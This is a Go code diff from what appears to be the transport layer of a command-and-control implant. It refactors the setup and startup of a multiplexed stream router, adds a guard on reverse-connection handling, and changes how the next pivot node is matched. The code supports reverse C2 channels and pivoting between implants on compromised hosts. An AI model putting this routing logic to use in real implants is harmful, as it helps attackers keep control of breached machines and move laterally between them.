@@ -193,12 +193,13 @@ ConnLoop:
 			// {{end}}
 			t.phyConnFallBack()
 		} else {
-			// Setup the transport's router
-			t.Router = SetupMuxRouter(t.Multiplexer)
 
 			// If everything is fine, setup RPC C2 code over a muxed stream.
 			// This function handles all errors and edge cases.
 			t.setupMuxC2()
+
+			// Setup the transport's router
+			t.Router = StartMuxRouter(t.Multiplexer)
 		}
 	}
 
@@ -231,6 +232,9 @@ func (t *Transport) StartMuxPivot(conn net.Conn, routeID uint32) (err error) {
 	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.Conn.LocalAddr(), t.Conn.RemoteAddr())
 	// {{end}}
 
+	// Setup the transport's router
+	t.Router = StartMuxRouter(t.Multiplexer)
+
 	// The first stream is the pivoted implant registering and speaking RPC.
 	go t.handleReverseC2(routeID)
 
@@ -250,9 +254,6 @@ func (t *Transport) handleReverseC2(routeID uint32) (err error) {
 		log.Printf("[mux] Error opening first stream: %s", err.Error())
 		// {{end}}
 	}
-
-	// Setup the transport's router
-	t.Router = SetupMuxRouter(t.Multiplexer)
 
 	// Connect back with the route ID provided and route the connection.
 	var route bon.Route = bon.Route(routeID)
@@ -276,7 +277,14 @@ func (t *Transport) handleReverseC2(routeID uint32) (err error) {
 	return
 }
 
+// HandleReverse - Quickly assign the transport to route a connection back to the Server.
 func (t *Transport) HandleReverse(routeID uint32, src net.Conn) (err error) {
+
+	// This function should never be called on the ServerComms transport
+	// so we check IDs and return if its the case.
+	if t.ID == ServerComms.ID {
+		return errors.New("Transport is active server comms transport: cannot handle reverse")
+	}
 
 	// Connect back with the route ID provided and route the connection.
 	var route bon.Route = bon.Route(routeID)
@@ -482,12 +490,13 @@ func (t *Transport) HandleRouteConn(route *pb.Route, src net.Conn) error {
 	// dial other hosts on this implant's host subnet.
 	if len(route.Nodes) == 1 {
 
-	} else if len(route.Nodes) > 1 {
+	}
+
+	if len(route.Nodes) > 1 {
 		// We find the transport connected to next node in chain, and give it the conn to be handled.
 		for _, t := range Transports.Active {
 			next := route.Nodes[1]
-			if t.URL.String() == next.Addr { // Change this, not reliable way to find the good transport.
-
+			if t.Conn.RemoteAddr().String() == next.Addr {
 				dst, err := t.Router.Connect(routeID)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -525,10 +534,10 @@ func (t *Transport) IsRouting() bool {
 	return false
 }
 
-// SetupMuxRouter - When the first route is registered, we register a mux router.
+// StartMuxRouter - When the first route is registered, we register a mux router.
 // After this call, the implant is able to route traffic that is being forwarded
 // by the previous node in the chain (server -> pivot -> this implant).
-func SetupMuxRouter(mux *yamux.Session) (router *bon.Bon) {
+func StartMuxRouter(mux *yamux.Session) (router *bon.Bon) {
 	// {{if .Config.Debug}}
 	log.Printf("Starting mux stream router")
 	// {{end}}
@@ -540,6 +549,8 @@ func SetupMuxRouter(mux *yamux.Session) (router *bon.Bon) {
 	// because no connection should arrive to the router
 	// without a defined route ID.
 
+	// We start the router by default
+	go router.Run()
 	return
 }
 
